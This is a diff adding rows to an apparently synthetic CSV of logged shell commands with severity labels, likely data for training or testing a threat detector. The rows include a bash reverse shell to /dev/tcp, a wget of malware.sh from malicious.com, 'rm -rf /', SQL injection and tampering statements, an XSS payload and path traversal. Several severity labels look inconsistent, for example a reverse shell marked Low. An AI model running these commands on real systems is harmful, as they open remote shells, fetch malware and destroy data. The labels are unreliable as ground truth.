@@ -9,3 +9,31 @@ d474e279-9d3f-4d27-8477-1aeb7a25dffb,2024-04-22 22:30:04.966029,netstat,nc -zv 1
 2024-04-22 23:01:47,f4055b43-1e97-4223-be17-ac2836b1f53d,telnet 192.168.0.1 25,wget http://malicious.com/malware.sh,/bin/bash -i > /dev/tcp/192.168.1.1/8080 0<&1 2>&1,rm -rf /,admin' OR 1=1 --,INSERT INTO users (username, password) VALUES ("hacker", "p@ssword");,telnet 192.168.0.1 25,/bin/bash -i > /dev/tcp/192.168.1.1/8080 0<&1 2>&1,netstat,wget http://malicious.com/malware.sh,netstat,ls,telnet 192.168.0.1 25,pwd,nc -zv 192.168.1.1 1-100,INSERT INTO users (username, password) VALUES ("hacker", "p@ssword");,netstat,admin' OR 1=1 --,Critical
 2024-04-22 23:01:57,820930b3-fdb5-4e70-ab11-6d07e9c9a0d4,echo $PATH,echo $PATH,telnet 192.168.0.1 25,<script>alert("XSS")</script>,telnet 192.168.0.1 25,High
 2024-04-22 23:02:09,97a72d32-a0f5-4fa2-aef2-4b174108593e,../etc/passwd,pwd,INSERT INTO users (username, password) VALUES ("hacker", "p@ssword");,telnet 192.168.0.1 25,rm -rf /,INSERT INTO users (username, password) VALUES ("hacker", "p@ssword");,INSERT INTO users (username, password) VALUES ("hacker", "p@ssword");,pwd,Critical
+5c550b78-2474-45aa-845b-de64664d8164,2024-04-25 16:09:31.268649,INSERT INTO users (username, password) VALUES ("hacker", "p@ssword");
+e41aa56d-6824-47ac-b264-c190f162f2d4,2024-04-25 16:09:33.567537,UPDATE users SET password = "hacked" WHERE id = 1;
+320e108d-cfa6-49ed-8045-d4c19e0c588d,2024-04-25 16:09:34.242492,mZsAtzlk7lNjn
+c46afe5b-d49e-4349-abfd-b99aa9c223b9,2024-04-25 16:09:34.243500,/bin/bash -i > /dev/tcp/192.168.1.1/8080 0<&1 2>&1
+c9d82cd9-445d-4f4d-95e2-177218bc144f,2024-04-25 16:09:37.202752,wget http://malicious.com/malware.sh
+c9d82cd9-445d-4f4d-95e2-177218bc144f,2024-04-25 16:09:39.726844,telnet 192.168.0.1 25
+c550d1f5-c979-40d6-b5f9-d060a54a3a99,2024-04-25 16:09:41.472715,lQGU1rLueUa68Kro
+841fa143-404b-442c-84c6-3afcd8737608,2024-04-25 16:13:54.320590,nc -zv 192.168.1.1 1-100
+841fa143-404b-442c-84c6-3afcd8737608,2024-04-25 16:13:56.429554,nc -zv 192.168.1.1 1-100,Low
+33c1ae9a-b0f3-4995-9345-328647fd738b,2024-04-25 16:13:56.430560,W4PIijH7eTK1ZGperyV8aq
+2417676e-13a7-4b56-8ef4-40b64067b080,2024-04-25 16:13:56.430560,admin' OR 1=1 --
+33c1ae9a-b0f3-4995-9345-328647fd738b,2024-04-25 16:13:56.431562,W4PIijH7eTK1ZGperyV8aq,Low
+2417676e-13a7-4b56-8ef4-40b64067b080,2024-04-25 16:13:57.171764,INSERT INTO users (username, password) VALUES ("hacker", "p@ssword");
+2417676e-13a7-4b56-8ef4-40b64067b080,2024-04-25 16:13:59.889577,admin' OR 1=1 --,Medium
+2417676e-13a7-4b56-8ef4-40b64067b080,2024-04-25 16:13:59.890676,INSERT INTO users (username, password) VALUES ("hacker", "p@ssword");,Medium
+9b1aaa2d-375f-43f4-ac33-bf94951e9b6b,2024-04-25 16:13:59.890676,rm -rf /
+9b1aaa2d-375f-43f4-ac33-bf94951e9b6b,2024-04-25 16:14:01.492474,rm -rf /,Low
+ed612cb7-ca2a-43ac-b571-8b289e4789f4,2024-04-25 16:14:01.493678,wget http://malicious.com/malware.sh
+ed612cb7-ca2a-43ac-b571-8b289e4789f4,2024-04-25 16:14:03.742309,telnet 192.168.0.1 25
+5f36bb92-cb5a-4ce2-ad51-19c7d59d7ab0,2024-04-25 16:14:05.139727,cxQ4T
+ed612cb7-ca2a-43ac-b571-8b289e4789f4,2024-04-25 16:14:05.139727,wget http://malicious.com/malware.sh,Medium
+ed612cb7-ca2a-43ac-b571-8b289e4789f4,2024-04-25 16:14:05.139727,telnet 192.168.0.1 25,Medium
+5f36bb92-cb5a-4ce2-ad51-19c7d59d7ab0,2024-04-25 16:14:05.140729,cxQ4T,Low
+1df3fd9f-1f79-4719-832b-0d469db9108e,2024-04-25 16:18:21.806759,'netstat /bin/bash -i > /dev/tcp/192.168.1.1/8080 0<&1 2>&1',Medium
+b643bf3e-fd0c-465d-9c83-8d69421db8f6,2024-04-25 16:18:21.807793,'aVmoiRoeg9Uf2ipkxJ',Low
+87e65221-0c72-49d7-9972-11026d0adbd2,2024-04-25 16:18:24.344984,'UPDATE users SET password = "hacked" WHERE id = 1;',Low
+3c5f7390-81c2-4d2f-aaf7-5d0cde91fca3,2024-04-25 16:18:26.655861,'INSERT INTO users (username, password) VALUES ("hacker", "p@ssword"); nc -zv 192.168.1.1 1-100',Medium
+1420992a-302e-451c-9f5c-f47b110bb8d0,2024-04-25 16:18:28.234602,'/bin/bash -i > /dev/tcp/192.168.1.1/8080 0<&1 2>&1',Low
